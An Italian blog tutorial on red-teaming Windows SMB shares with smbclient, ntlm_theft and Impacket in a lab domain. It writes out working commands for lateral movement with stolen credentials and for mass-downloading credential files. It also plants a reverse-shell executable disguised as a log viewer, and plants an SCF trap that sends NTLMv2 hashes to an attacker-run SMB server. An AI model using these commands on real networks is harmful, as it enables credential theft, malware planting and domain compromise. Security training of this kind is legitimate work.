---
title: 'Smbclient: accesso e attacco alle condivisioni Windows'
description: >-
  Con smbclient puoi accedere, leggere e scrivere file su condivisioni SMB.
  Scopri come usarlo per attacchi interni, enumeration e pivoting in AD.
image: /smbcliehnt.webp
draft: true
date: 2026-01-24T00:00:00.000Z
categories:
  - tools
subcategories:
  - recon
tags:
  - smbclient
  - smb
---

# SMBclient: dall’accesso alla share al dominio

Report Red Team | Ambiente controllato autorizzato

Questa guida approfondisce l’uso offensivo di smbclient andando oltre la semplice enumerazione di file. L’obiettivo è mostrare come trasformare un accesso base a una share SMB in un vettore per il movimento laterale, il furto di credenziali tramite hash NTLM e la preparazione di attacchi Pass-the-Hash e NTLM relay. Nel flusso operativo vengono integrati ntlm\_theft e la suite Impacket.

## Introduzione: SMB come vettore strategico

SMB non è solo un protocollo di condivisione file. In ambienti Windows e Active Directory rappresenta un canale centrale per l’autenticazione e un punto critico di raccolta di informazioni sensibili.

L’accesso anonimo o guest può talvolta fornire un foothold iniziale, ma è con credenziali valide, anche a basso privilegio, che smbclient esprime il suo reale valore offensivo.

SMB consente di:

* muoversi lateralmente tra sistemi
* individuare file di configurazione, script e backup
* innescare il furto di hash NTLM
* preparare fasi successive di post-exploitation

L’approccio corretto è progressivo: da una share accessibile si estraggono dati, si espande l’accesso e si punta a credenziali sempre più privilegiate fino al dominio.

## Setup dell’ambiente offensivo

Oltre a smbclient sono necessari strumenti di supporto come Impacket e ntlm\_theft.

```
sudo apt update
sudo apt install impacket-scripts python3-impacket seclists -y
```

Clonazione di ntlm\_theft:

```
git clone https://github.com/Greenwolf/ntlm_theft
cd ntlm_theft
pip3 install -r requirements.txt
```

Per le tecniche di NTLM theft è necessario un server SMB controllato dall’attaccante, ad esempio smbserver.py di Impacket o Responder.

## Tecniche offensive avanzate

## Tecnica 1: movimento laterale con credenziali rubate

Situazione: su WS01 vengono trovate credenziali di dominio LAB\svc\_deploy all’interno di unattend.xml. L’obiettivo è verificare l’accesso alle share di SRV01.

```
smbclient -L //SRV01 -U 'LAB\svc_deploy' -W LAB
```

Connessione alla share individuata:

```
smbclient //SRV01/Deploy_scripts -U 'LAB\svc_deploy' -W LAB -c 'ls'
```

Download di uno script di provisioning:

```
smbclient //SRV01/Deploy_scripts -U 'LAB\svc_deploy' -W LAB -c 'get join_domain.ps1'
```

Questa è la forma classica di movimento laterale. Credenziali recuperate in un contesto permettono l’accesso a risorse in un altro. Script di provisioning e automazione di dominio spesso contengono password hardcoded o token privilegiati.

## Tecnica 2: ricerca aggressiva di credenziali nei file

Situazione: accesso in scrittura alla share Data su SRV01.

```
smbclient //SRV01/Data -U 'LAB\svc_deploy' -W LAB -c 'prompt OFF; recurse ON; mget *.txt *.ini *.config *.xml *.bak *.vbs *.ps1 *.bat *.kdbx *.env'
```

Questa tecnica consente di scaricare ricorsivamente file potenzialmente sensibili. Il loot va analizzato localmente con grep, strings o strumenti simili per individuare password, chiavi o token.

## Tecnica 3: deposito di payload su share scrivibili

Situazione: la share Data è accessibile a più utenti e account di servizio.

```
smbclient //SRV01/Data -U 'LAB\svc_deploy' -W LAB -c 'put reverse_shell.exe log_viewer.exe'
```

Inserimento di un file di istruzioni per favorire l’esecuzione:

```
smbclient //SRV01/Data -U 'LAB\svc_deploy' -W LAB -c 'put instructions.txt README_logs.txt'
```

Le share scrivibili sono punti ideali per la distribuzione di payload o trappole. Account di servizio e job automatici aumentano la probabilità di esecuzione del file malevolo.

## Tecnica 4: furto di hash NTLM con file trappola

Situazione: accesso in scrittura a \SRV01\Public con l’obiettivo di rubare hash NTLM.

Concetto: Windows tenta automaticamente l’autenticazione SMB quando apre file che contengono riferimenti a percorsi remoti, inviando l’hash NTLMv2 dell’utente loggato.

Generazione del file trappola:

```
python3 ntlm_theft.py --generate scf --server 192.168.1.50 --filename Vacation_Photos
```

Upload nella share:

```
smbclient //SRV01/Public -U 'LAB\svc_deploy' -W LAB -c 'put Vacation_Photos.scf'
```

Avvio del server SMB in ascolto:

```
impacket-smbserver SHARE ./loot -smb2support
```

Quando un utente esplora la share, il suo hash NTLMv2 viene inviato automaticamente al server dell’attaccante.

Questa tecnica consente cracking offline o utilizzo diretto in Pass-the-Hash o NTLM relay.

## Scenario di attacco completo

Contesto: utente LAB\user1 con accesso a Department\_Share su FILESRV01.

Ricognizione iniziale:

```
smbclient //FILESRV01/Department_Share -U 'LAB\user1' -W LAB -c 'ls; recurse ON; mget *.txt *.xlsx'
```

Vengono trovate credenziali svc\_mssql in un file Excel.

Verifica accesso su DBSRV01:

```
smbclient -L //DBSRV01 -U 'LAB\svc_mssql' -W LAB
```

Upload file trappola e cattura hash tramite Responder.

Cracking dell’hash e verifica privilegi, seguiti da dump delle credenziali tramite Impacket fino al controllo del dominio.

Risultato finale: da una semplice share SMB si arriva alla compromissione di account privilegiati e del dominio Active Directory.

## Considerazioni finali

SMB deve essere considerato un protocollo di autenticazione, non solo di file sharing.
smbclient è lo strumento operativo.
ntlm\_theft costruisce le trappole.
Impacket riceve ed estrae valore.

Usati in catena permettono escalation complete in ambienti mal configurati.

## HackITA

[Supporta](https://hackita.it/supporto/) HackITA per mantenere contenuti tecnici indipendenti.
[Formazione](https://hackita.it/servizi/) 1:1 su Active Directory e Red Teaming.
Servizi di sicurezza per aziende in ambienti autorizzati.

Non limitarti ad accedere a una share.
Usala come vettore.
Chiudi la catena.
